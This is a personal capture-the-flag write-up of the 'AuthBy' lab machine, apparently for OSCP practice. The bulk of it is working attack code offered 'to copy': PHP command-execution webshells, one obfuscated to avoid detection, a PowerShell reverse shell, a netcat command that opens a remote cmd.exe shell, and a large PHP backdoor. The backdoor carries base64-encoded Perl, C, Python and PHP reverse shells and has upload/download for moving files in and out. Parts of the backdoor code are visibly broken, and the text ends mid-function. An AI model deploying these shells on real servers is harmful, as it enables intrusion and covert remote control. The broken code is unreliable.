# AuthBy Writeup

Name: AuthBy
Date:  
Difficulty:  Intermediate
Goals:  
- TJNull List OSCP-like machine - return to form
Learnt:
- A lot of php 
Beyond Root:
- PHP webshell

- [[AuthBy-Notes.md]]
- [[AuthBy-CMD-by-CMDs.md]]

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

Nmap returned anonymous access to the FTP server. A quick brute force of non encrypted FTP allows for both anonymous login and Administrative access to write files to the server.
![](hydraftp.png)
## Default Password 

With the default password 
```
wget -r ftp://admin:admin@192.168.174.46/
```

We can then crack the hash in .htpasswd used to restrict access on the web server
![](htpasswd.png)

This just a MD5 hash 
![](apache1hash.png)

That leads to being able read and execute uploaded files from the FTP server in the root web directory that requires authentication. 
![](hashcatcracked.png)

Regardless of using an uncommon port to host a web server we can still access this in simplistic set of step discussed previously.
![](offseceliteforwebpage.png)

Then uploading a webshell.
![](webadeshell.png)

https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html

I ran it into some issues that were easily fixed - it is just accessing the webshell page without providing data for the cmd to execute arbitrary commands on the webserver 
![](nowebshellsadness.png)

For the beyond root I decided to learn some PHP and cobble together my own webshell:
![](mademyownwebshellfromothers.png)

The code is here to copy:
```php
<html>
<head>
<title>Perspective honing persistence</title>
// Made from simple_cmd.php, simple-backdoor.php
<body>
<form method=POST>
<input type=TEXT name="cmd" size=64 value="<?=$cmd?>"
<input type=TEXT name="systemRequest" size=64 value="<?=$systemRequest?>"
<hr>
</form>
<?php $cmd = $_REQUEST["cmd"];?>
<?php if ($cmd != "") { print Shell_Exec($cmd); } else { echo "cmd=";}?>
<?php
if(isset($_REQUEST['systemRequest'])){
        echo "<pre>";
        $systemRequest = ($_REQUEST['systemRequest']);
        system($systemRequest);
        echo "</pre>";
        die;
}
?>
</body>
</html>
```

I could have also used [Online php-obfuscator](https://www.gaijin.at/en/tools/php-obfuscator) from [[Wreath-Writeup]] may also help in adding to discovery.
```php
<html>
<head>
<title>Perspective honing persistence</title>
// Made from simple_cmd.php, simple-backdoor.php
<body>
<form method=POST>
<input type=TEXT name="cmd" size=64 value="<?=$edfff0a7fa1a5?>"
<input type=TEXT name="systemRequest" size=64 value="<?=$k06ca1b7b4ed8?>"
<hr>
</form>
<?php $edfff0a7fa1a5=$_REQUEST[base64_decode('Y21k')];?>
<?php if($edfff0a7fa1a5!=''){printShell_Exec($edfff0a7fa1a5);}else{echo base64_decode('Y21kPQ==');}?>
<?php if(isset($_REQUEST[base64_decode('c3lzdGVtUmVxdWVzdA==')])){echo base64_decode('PHByZT4=');$k06ca1b7b4ed8=($_REQUEST[base64_decode('c3lzdGVtUmVxdWVzdA==')]);system($k06ca1b7b4ed8);echo base64_decode('PC9wcmU+');die;}?>
</body>
</html>
```

Running `hostname` on the server
![](addederrorreportingzero.png)

More improvements to my webshell
```php
<html>
<head>
<title>Perspective honing persistence</title>
// Made from simple_cmd.php, simple-backdoor.php
<body>
<form method=POST>
<input type=TEXT name="cmd" size=64 value="<?=$cmd?>"
<input type=TEXT name="systemRequest" size=64 value="<?=$systemRequest?>"
<hr>
</form>
<?php error_reporting(0);?>
<?php $cmd = $_REQUEST["cmd"];?>
<?php if ($cmd != "") { print Shell_Exec($cmd); } else { echo "cmd=";}?>
<?php
if(isset($_REQUEST['systemRequest'])){
        echo "<pre>";
        $systemRequest = ($_REQUEST['systemRequest']);
        system($systemRequest);
        echo "</pre>";
        die;
}
?>
</body>
</html>

```


Alh4zr3d's obfuscate reverse shell is just this with the variables changed, save this to a .txt file alter variables where required.
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

He then base64, little endians it: convert it to UTF-16LE, which the Windows Default encoding, encodes it to base64 then removes the newline .
```bash
iconv -f ASCII -t UTF-16LE $reverseshell.txt | base64 | tr -d "\n"
```

Using Powershell did not work. Uploaded nc.exe felt very dirty doing so, but worked.
![](ncupload.png)

## PrivEsc

The Privilege Escalation is about finding the right exploit for a weird server. It is a weird Server 2008 version that states it is both a x64 and x86 image. 
![](livda.png)

Uploaded JuicyPotato exploit - [decoder exploit blog](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/) via FTP as presumably for FTP is being used by an administrator to interact with this box so no need for smelling the juiciest of potatoes, which smell very, very bad. 
![](juicypotato.png)

Forgot that my arsenal was not categorised correctly and uploaded the x64 version, because I am stupid. So used not being able to run `systeminfo`. Also as previously stated it a weird version with OS name even spelt incorrectly.
![](systeminfo.png)

I will use the BITS CLSID to remind myself of the exploit more than anything:
```
{69AD4AEE-51BE-439b-A92C-86AE490E8B30}
```

Then...reread what is vulnerable and what is not vulnerable and why from various source such as [jlajara](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#genericPotato).

Double checking for the wpad entry
![](nowpadentry.png)

As per ACTUALLY READING THE INSTRUCTIONS
![](window2008server.png)

This failed for some reason that lead me to try both versions of PrintSpoofer.exe
```
.\potato.exe -ip 127.0.0.1 -cmd "c:\wamp\www\nc.exe 192.168.45.225 6969 -e c:\windows\system32\cmd.exe" -disable_exhaust true -disable_defender true --spoof_host WPAD.EMC.LOCAL
```

Built my own versions of both x86 and x64 SweetPotato considering [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens) for both [SweetPotato](https://github.com/CCob/SweetPotato) and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer). x64 and x86 version return the same error
![](neitherx8664-sameerror.png)

But it is not actually running...
![](itran.png)

Ran wes.py and there are lots of Privilege Escalations to fall back on if required. I am just concern that seImpersonate Privilege is just glaring in the face. Due to the only documentation on any of the github repositories directly mentioning Windows Server 2008. I decided to retry the original. 

Try https://github.com/antonioCoco/RogueWinRM



## Beyond Root

PHP webshell for Pentesting - does all the techniques and tricks to empirical test which works and which does not to make reporting and remembering a language I can barely say I can use easier.

Started from this webshell.php
```php
<?php
// Made from simple_cmd.php, simple-backdoor.php, php-backdoor.php
// php-backdoor can upload and download stuff!


error_reporting(0);
$cmd = $_REQUEST["cmd"];
if ($cmd != ""){ print Shell_Exec($cmd); 
} else { 
echo "cmd=";
}


if(isset($_REQUEST['systemRequest'])){
        echo "<pre>";
        $systemRequest = ($_REQUEST['systemRequest']);
        system($systemRequest);
        echo "</pre>";
        die;
}
// Really want it to state: Perspective Honed Persistence
// -- The empirical pentest webshell 
//
// Print what does and does not work - no include function or  
// Test the transpiled asp(x) version
?>


<pre><form action="<? echo $PHP_SELF; ?>" METHOD=GET >execute command: <input type="text" name="cmd"><input type="submit" value="go"><hr></form> 
<form action="<? echo $PHP_SELF; ?>" METHOD=GET >execute command: <input type="text" name="cmd"><input type="submit" value="go"><hr></form> 

http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix
or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win
</form>
```

To this multiple commits later:
```php
<?php
// Made bits I liked the look of from  simple_cmd.php, simple-backdoor.php, php-backdoor.php, predator.php, AK-74.php
// At some point it helps if you like silly names in the early 2000s
// The reinvented wheel made with love and ChatGpt to
// php-backdoor can upload and download stuff!
//
// Perspective-Honed-Persistence: MWIwNzI3N2QxZTM1MjVkYWI3M2JiMzA4NzcwOWFhZWY6NDBhNjNjNDQ0NWRlNzVkOTY2YmQ5NDk0MGI1ZmJjNDcK
ob_implicit_flush();
error_reporting(0);
ini_set("display_errors", 0);
$phpVersion = phpversion();
$user = "1b07277d1e3525dab73bb3087709aaef"; //login = 'badadmin'
$pass = "40a63c4445de75d966bd94940b5fbc47"; //pass  = 'personalhomepagewebshell'
$headers = getallheaders();
if (version_compare($phpVersion, "5.0.0", "<")) {
    if (isset($HTTP_COOKIE_VARS["Perspective-Honed-Persistence"])) {
        $cookieValue = base64_decode($_COOKIE["Perspective-Honed-Persistence"]);
        $cookie_parts = explode(":", $cookieValue, 2);

        if (count($cookie_parts) == 2) {
            $cookie_user = $cookie_parts[0];
            $cookie_pass = $cookie_parts[1];
        }
    } else {
        if (isset($_COOKIE["Perspective-Honed-Persistence"])) {
            $cookieValue = base64_decode(
                $_COOKIE["Perspective-Honed-Persistence"]
            );
            list($cookie_user, $cookie_pass) = explode(":", $cookieValue, 2);
        }
    }

    if (md5($cookie_user) != $user && md5($cookie_pass) != $pass) {
        error_reporting(0);
        ini_set("display_errors", 0);
        header("HTTP/1.0 403 Unauthorized");
        exit("Access Denied");
    }
} else {
    error_reporting(0);
    echo '<form action="' . $_SERVER["PHP_SELF"] . '" method="GET">';
    echo 'Execute command: <input type="text" name="cmd"><input type="submit" value="go"><hr>';
    echo "</form>";
    echo "Commands:";
    echo "      kill : Will delete this file";
    echo "Tests: ";
    echo "      testcmds : tests shell_exec, system, passthru, eval with \`whoami\`  ";
    echo "      testDevShm : check permissions of /dev/shm";
    echo "      testperl : prints the help for perl";
    echo "      testgcc : prints the help for gcc";
    echo "      testpython : prints the help for python3";
    echo "      testwget : prints the help for wget";
    echo "      testcurl : prints the help for curl";
    echo "Command execution - ?<listed handled>=Your command goes here";
    echo "      shell_exec";
    echo "      system";
    echo "      passthru";
    echo "      eval";
    echo "Exfil and Infil:";
    echo " upload : ";
    echo " download : ";

    if (isset($_REQUEST["shell_exec"])) {
        echo "<pre>";
        $shell_exec = $_REQUEST["shell_exec"];
        shell_exec($shell_exec);
        echo "</pre>";
        die();
    }

    if (isset($_REQUEST["system"])) {
        echo "<pre>";
        $system = $_REQUEST["system"];
        system($system);
        echo "</pre>";
        die();
    }

    if (isset($_REQUEST["passthru"])) {
        echo "<pre>";
        $passthru = $_REQUEST["passthru"];
        passthru($passthru);
        echo "</pre>";
        die();
    }

    if (isset($_REQUEST["eval"])) {
        echo "<pre>";
        $eval = $_REQUEST["eval"];
        passthru($eval);
        echo "</pre>";
        die();
    }

    if (isset($_REQUEST["testcmds"])) {
        echo "<pre>";
        $test = testcmds();
        echo "$test";
        echo "</pre>";
        die();
    }

    if (isset($_REQUEST["testDevShm"])) {
        echo "<pre>";
        $test = testDevShm();
        echo "$test";
        echo "</pre>";
        die();
    }

    if (isset($_REQUEST["testperl"])) {
        echo "<pre>";
        $test = testperl();
        echo "$test";
        echo "</pre>";
        die();
    }

    if (isset($_REQUEST["testgcc"])) {
        echo "<pre>";
        $test = testgcc();
        echo "$test";
        echo "</pre>";
        die();
    }

    if (isset($_REQUEST["testpython"])) {
        echo "<pre>";
        $testpython = testpython();
        echo "$test";
        echo "</pre>";
        die();
    }

    if (isset($_REQUEST["testwget"])) {
        echo "<pre>";
        $test = testwget();
        echo "$test";
        echo "</pre>";
        die();
    }

    if (isset($_REQUEST["testcurl"])) {
        echo "<pre>";
        $test = testcurl();
        echo "$test";
        echo "</pre>";
        die();
    }

    if (isset($_REQUEST["testGetMicrotime"])) {
        executeAndDisplay("getmicrotime");
    }

    if (isset($_REQUEST["testGetSystem"])) {
        executeAndDisplay("getsystem");
    }

    if (isset($_REQUEST["testGetServer"])) {
        executeAndDisplay("getserver");
    }

    if (isset($_REQUEST["testGetUser"])) {
        executeAndDisplay("getuser");
    }

    if (isset($_REQUEST["upload"])) {
        error_reporting(1);
        if (!isset($_REQUEST["dir"])) {
            die("Specify a directory!?!");
        }
    } else {
        $dir = $_REQUEST["dir"];
        $fname = $HTTP_POST_FILES["file_name"]["name"];
        if (
            !move_uploaded_file(
                $HTTP_POST_FILES["file_name"]["tmp_name"],
                $dir . $fname
            )
        ) {
            die("File uploading error.");
        }
        error_reporting(0);
        die();
    }

    if (isset($_REQUEST["download"])) {
        $dir = isset($_REQUEST["dir"]) ? $_REQUEST["dir"] : "";
        if (!empty($dir)) {
            $filename = isset($_REQUEST["file_name"])
                ? $_REQUEST["file_name"]
                : "";
            if (file_exists($dir . $filename)) {
                header("Content-Description: File Transfer");
                header("Content-Type: application/octet-stream");
                header(
                    'Content-Disposition: attachment; filename="' .
                        basename($filename) .
                        '"'
                );
                header("Expires: 0");
                header("Cache-Control: must-revalidate");
                header("Pragma: public");
                header("Content-Length: " . filesize($dir . $filename));
                readfile($dir . $filename);
                exit();
            } else {
                die("File does not exist.");
            }
        } else {
            die("Specify a directory.");
        }
    }

    if ($_GET["kill"] == "yes") {
        unlink($_SERVER["SCRIPT_FILENAME"]);
        echo "<script>alert('Your shell script was successfully deleted!')</script>";
    }
}

function getmicrotime()
{
    list($usec, $sec) = explode(" ", microtime());
    return (float) $usec + (float) $sec;
}

function getsystem()
{
    return php_uname("s") . " " . php_uname("r") . " " . php_uname("v");
}

function getserver()
{
    return getenv("SERVER_SOFTWARE");
}

function getuser()
{
    $out = get_current_user();
    if ($out != "SYSTEM") {
        if (($out = ex("id")) == "") {
            $out =
                "uid=" .
                getmyuid() .
                "(" .
                get_current_user() .
                ") gid=" .
                getmygid();
        }
    }
    return $out;
}

function pwd()
{
    if (isset($_POST["value"])) {
        $_SESSION["pwd"] = stripslashes($_POST["value"]);
    }
    $cwd = getcwd();
    if (DIRECTORY_SEPARATOR === "/") {
        return rtrim($cwd, "/") . "/";
    } elseif (DIRECTORY_SEPARATOR === "\\") {
        return rtrim($cwd, "\\") . "\\";
    }
    return $cwd;
}

function selectShell($ip, $port, $method)
{
    $perl = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";

    $c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";

    $python3 = "aW1wb3J0IHNvY2tldCwgc3VicHJvY2Vzcywgb3MsIHN5cwpob3N0ID0gc3RyKHN5cy5hcmd2WzFd
KQpwb3J0ID0gaW50KHN5cy5hcmd2WzJdKQphZGRyID0gKGhvc3QsIHBvcnQpCnMgPSBzb2NrZXQu
c29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdChhZGRy
KQpvcy5kdXAyKHMuZmlsZW5vKCksIDApCm9zLmR1cDIocy5maWxlbm8oKSwgMSkKb3MuZHVwMihz
LmZpbGVubygpLCAyKQppbXBvcnQgcHR5CnB0eS5zcGF3bigiL2Jpbi9zaCIpCg==";

    $php = "PD9waHAKLy8gcGhwLXJldmVyc2Utc2hlbGwgLSBBIFJldmVyc2UgU2hlbGwgaW1wbGVtZW50YXRp
b24gaW4gUEhQCi8vIENvcHlyaWdodCAoQykgMjAwNyBwZW50ZXN0bW9ua2V5QHBlbnRlc3Rtb25r
ZXkubmV0Ci8vCi8vIFRoaXMgdG9vbCBtYXkgYmUgdXNlZCBmb3IgbGVnYWwgcHVycG9zZXMgb25s
eS4gIFVzZXJzIHRha2UgZnVsbCByZXNwb25zaWJpbGl0eQovLyBmb3IgYW55IGFjdGlvbnMgcGVy
Zm9ybWVkIHVzaW5nIHRoaXMgdG9vbC4gIFRoZSBhdXRob3IgYWNjZXB0cyBubyBsaWFiaWxpdHkK
Ly8gZm9yIGRhbWFnZSBjYXVzZWQgYnkgdGhpcyB0b29sLiAgSWYgdGhlc2UgdGVybXMgYXJlIG5v
dCBhY2NlcHRhYmxlIHRvIHlvdSwgdGhlbgovLyBkbyBub3QgdXNlIHRoaXMgdG9vbC4KLy8KLy8g
SW4gYWxsIG90aGVyIHJlc3BlY3RzIHRoZSBHUEwgdmVyc2lvbiAyIGFwcGxpZXM6Ci8vCi8vIFRo
aXMgcHJvZ3JhbSBpcyBmcmVlIHNvZnR3YXJlOyB5b3UgY2FuIHJlZGlzdHJpYnV0ZSBpdCBhbmQv
b3IgbW9kaWZ5Ci8vIGl0IHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGlj
IExpY2Vuc2UgdmVyc2lvbiAyIGFzCi8vIHB1Ymxpc2hlZCBieSB0aGUgRnJlZSBTb2Z0d2FyZSBG
b3VuZGF0aW9uLgovLwovLyBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUg
dGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwKLy8gYnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3aXRo
b3V0IGV2ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YKLy8gTUVSQ0hBTlRBQklMSVRZIG9yIEZJ
VE5FU1MgRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFLiAgU2VlIHRoZQovLyBHTlUgR2VuZXJhbCBQ
dWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLgovLwovLyBZb3Ugc2hvdWxkIGhhdmUgcmVj
ZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhbG9uZwovLyB3
aXRoIHRoaXMgcHJvZ3JhbTsgaWYgbm90LCB3cml0ZSB0byB0aGUgRnJlZSBTb2Z0d2FyZSBGb3Vu
ZGF0aW9uLCBJbmMuLAovLyA1MSBGcmFua2xpbiBTdHJlZXQsIEZpZnRoIEZsb29yLCBCb3N0b24s
IE1BIDAyMTEwLTEzMDEgVVNBLgovLwovLyBUaGlzIHRvb2wgbWF5IGJlIHVzZWQgZm9yIGxlZ2Fs
IHB1cnBvc2VzIG9ubHkuICBVc2VycyB0YWtlIGZ1bGwgcmVzcG9uc2liaWxpdHkKLy8gZm9yIGFu
eSBhY3Rpb25zIHBlcmZvcm1lZCB1c2luZyB0aGlzIHRvb2wuICBJZiB0aGVzZSB0ZXJtcyBhcmUg
bm90IGFjY2VwdGFibGUgdG8KLy8geW91LCB0aGVuIGRvIG5vdCB1c2UgdGhpcyB0b29sLgovLwov
LyBZb3UgYXJlIGVuY291cmFnZWQgdG8gc2VuZCBjb21tZW50cywgaW1wcm92ZW1lbnRzIG9yIHN1
Z2dlc3Rpb25zIHRvCi8vIG1lIGF0IHBlbnRlc3Rtb25rZXlAcGVudGVzdG1vbmtleS5uZXQKLy8K
Ly8gRGVzY3JpcHRpb24KLy8gLS0tLS0tLS0tLS0KLy8gVGhpcyBzY3JpcHQgd2lsbCBtYWtlIGFu
IG91dGJvdW5kIFRDUCBjb25uZWN0aW9uIHRvIGEgaGFyZGNvZGVkIElQIGFuZCBwb3J0LgovLyBU
aGUgcmVjaXBpZW50IHdpbGwgYmUgZ2l2ZW4gYSBzaGVsbCBydW5uaW5nIGFzIHRoZSBjdXJyZW50
IHVzZXIgKGFwYWNoZSBub3JtYWxseSkuCi8vCi8vIExpbWl0YXRpb25zCi8vIC0tLS0tLS0tLS0t
Ci8vIHByb2Nfb3BlbiBhbmQgc3RyZWFtX3NldF9ibG9ja2luZyByZXF1aXJlIFBIUCB2ZXJzaW9u
IDQuMyssIG9yIDUrCi8vIFVzZSBvZiBzdHJlYW1fc2VsZWN0KCkgb24gZmlsZSBkZXNjcmlwdG9y
cyByZXR1cm5lZCBieSBwcm9jX29wZW4oKSB3aWxsIGZhaWwgYW5kIHJldHVybiBGQUxTRSB1bmRl
ciBXaW5kb3dzLgovLyBTb21lIGNvbXBpbGUtdGltZSBvcHRpb25zIGFyZSBuZWVkZWQgZm9yIGRh
ZW1vbmlzYXRpb24gKGxpa2UgcGNudGwsIHBvc2l4KS4gIFRoZXNlIGFyZSByYXJlbHkgYXZhaWxh
YmxlLgovLwovLyBVc2FnZQovLyAtLS0tLQovLyBTZWUgaHR0cDovL3BlbnRlc3Rtb25rZXkubmV0
L3Rvb2xzL3BocC1yZXZlcnNlLXNoZWxsIGlmIHlvdSBnZXQgc3R1Y2suCgpzZXRfdGltZV9saW1p
dCAoMCk7CiRWRVJTSU9OID0gIjEuMCI7CiRpcCA9ICdMSE9TVCc7IAokcG9ydCA9IExQT1JUOwok
Y2h1bmtfc2l6ZSA9IDE0MDA7CiR3cml0ZV9hID0gbnVsbDsKJGVycm9yX2EgPSBudWxsOwokc2hl
bGwgPSAnVVNFUl9TSEVMTCc7CiRkYWVtb24gPSAwOwokZGVidWcgPSAwOwppZiAoZnVuY3Rpb25f
ZXhpc3RzKCdwY250bF9mb3JrJykpIHsKCSRwaWQgPSBwY250bF9mb3JrKCk7CgkKCWlmICgkcGlk
ID09IC0xKSB7CgkJcHJpbnRpdCgiRVJST1I6IENhbid0IGZvcmsiKTsKCQlleGl0KDEpOwoJfQkK
CWlmICgkcGlkKSB7CgkJZXhpdCgwKTsKCX0KCWlmIChwb3NpeF9zZXRzaWQoKSA9PSAtMSkgewoJ
CXByaW50aXQoIkVycm9yOiBDYW4ndCBzZXRzaWQoKSIpOwoJCWV4aXQoMSk7Cgl9CgoJJGRhZW1v
biA9IDE7Cn0gZWxzZSB7CglwcmludGl0KCJXQVJOSU5HOiBGYWlsZWQgdG8gZGFlbW9uaXNlLiAg
VGhpcyBpcyBxdWl0ZSBjb21tb24gYW5kIG5vdCBmYXRhbC4iKTsKfQpjaGRpcigiLyIpOwp1bWFz
aygwKTsKJHNvY2sgPSBmc29ja29wZW4oJGlwLCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCAzMCk7
CmlmICghJHNvY2spIHsKCXByaW50aXQoIiRlcnJzdHIgKCRlcnJubykiKTsKCWV4aXQoMSk7Cn0K
JGRlc2NyaXB0b3JzcGVjID0gYXJyYXkoCiAgIDAgPT4gYXJyYXkoInBpcGUiLCAiciIpLCAgCiAg
IDEgPT4gYXJyYXkoInBpcGUiLCAidyIpLCAKICAgMiA9PiBhcnJheSgicGlwZSIsICJ3IikgICAK
KTsKJHByb2Nlc3MgPSBwcm9jX29wZW4oJHNoZWxsLCAkZGVzY3JpcHRvcnNwZWMsICRwaXBlcyk7
CgppZiAoIWlzX3Jlc291cmNlKCRwcm9jZXNzKSkgewoJcHJpbnRpdCgiRVJST1I6IENhbid0IHNw
YXduIHNoZWxsIik7CglleGl0KDEpOwp9CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzBdLCAw
KTsKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMV0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5n
KCRwaXBlc1syXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssIDApOwpwcmludGl0KCJT
dWNjZXNzZnVsbHkgb3BlbmVkIHJldmVyc2Ugc2hlbGwgdG8gJGlwOiRwb3J0Iik7CndoaWxlICgx
KSB7CglpZiAoZmVvZigkc29jaykpIHsKCQlwcmludGl0KCJFUlJPUjogU2hlbGwgY29ubmVjdGlv
biB0ZXJtaW5hdGVkIik7CgkJYnJlYWs7Cgl9CglpZiAoZmVvZigkcGlwZXNbMV0pKSB7CgkJcHJp
bnRpdCgiRVJST1I6IFNoZWxsIHByb2Nlc3MgdGVybWluYXRlZCIpOwoJCWJyZWFrOwoJfQoJJHJl
YWRfYSA9IGFycmF5KCRzb2NrLCAkcGlwZXNbMV0sICRwaXBlc1syXSk7CgkkbnVtX2NoYW5nZWRf
c29ja2V0cyA9IHN0cmVhbV9zZWxlY3QoJHJlYWRfYSwgJHdyaXRlX2EsICRlcnJvcl9hLCBudWxs
KTsKCWlmIChpbl9hcnJheSgkc29jaywgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0
KCJTT0NLIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkc29jaywgJGNodW5rX3NpemUpOwoJCWlm
ICgkZGVidWcpIHByaW50aXQoIlNPQ0s6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkcGlwZXNbMF0sICRp
bnB1dCk7Cgl9CglpZiAoaW5fYXJyYXkoJHBpcGVzWzFdLCAkcmVhZF9hKSkgewoJCWlmICgkZGVi
dWcpIHByaW50aXQoIlNURE9VVCBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzFdLCAk
Y2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUOiAkaW5wdXQiKTsKCQlm
d3JpdGUoJHNvY2ssICRpbnB1dCk7Cgl9CglpZiAoaW5fYXJyYXkoJHBpcGVzWzJdLCAkcmVhZF9h
KSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUiBSRUFEIik7CgkJJGlucHV0ID0gZnJl
YWQoJHBpcGVzWzJdLCAkY2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJS
OiAkaW5wdXQiKTsKCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7Cgl9Cn0KZmNsb3NlKCRzb2NrKTsK
ZmNsb3NlKCRwaXBlc1swXSk7CmZjbG9zZSgkcGlwZXNbMV0pOwpmY2xvc2UoJHBpcGVzWzJdKTsK
cHJvY19jbG9zZSgkcHJvY2Vzcyk7CmZ1bmN0aW9uIHByaW50aXQgKCRzdHJpbmcpIHsKCWlmICgh
JGRhZW1vbikgewoJCXByaW50ICIkc3RyaW5nXG4iOwoJfQp9Cj8+IAoKCgo=";

    if ($method == "PHP") {
        fputs($i = fopen("/tmp/shlbck.php", "w"), base64_decode($php));
        fclose($i);
        $buffer = "";
        if $patterns = array("/LHOST/" => $ip,"/LPORT/" => $port);

        $patterns = [
            "/LHOST/" => $ip,
            "/LPORT/" => $port,
        ];
        fopen($i, "r+");
        while (!feof($file_handle)) {
            $line = fgets($file_handle);
            foreach ($patterns as $pattern => $replacement) {
                $line = preg_replace_callback(
                    $pattern,
                    function ($matches) use ($replacement) {
                        return $replacement;
                    },
                    $line
                );
            }
            $buffer .= $line;
        }
        fseek($file_handle, 0);
        ftruncate($file_handle, 0);
        fwrite($file_handle, $buffer);
        fclose($file_handle);
        ex(which("php") . "-f /tmp/shlhck.php &");
        unlink("/tmp/shlbck");
        return ex("netstat -an | grep -i listen");
    } elseif ($method == "Perl") {
        fputs($i = fopen("/tmp/shlbck", "w"), base64_decode($perl));
        fclose($i);
        ex(which("perl") . " /tmp/shlbck " . $ip . " " . $port . " &");
        unlink("/tmp/shlbck");
        return ex("netstat -an | grep -i listen");
    } elseif ($method == "C") {
        fputs($i = fopen("/tmp/shlbck.c", "w"), base64_decode($c));
        fclose($i);
        ex("gcc shlbck.c -o shlbck");
        unlink("shlbck.c");
        ex(which("nohup") . "/tmp/shlbck " . $ip . " " . $port . " &");
        unlink("/tmp/shlbck");
        return ex("netstat -an | grep -i listen");
    } elseif ($method == "Python3") {
        puts($i = fopen("/tmp/shlbck.py", "w"), base64_decode($python3));
        fclose($i);
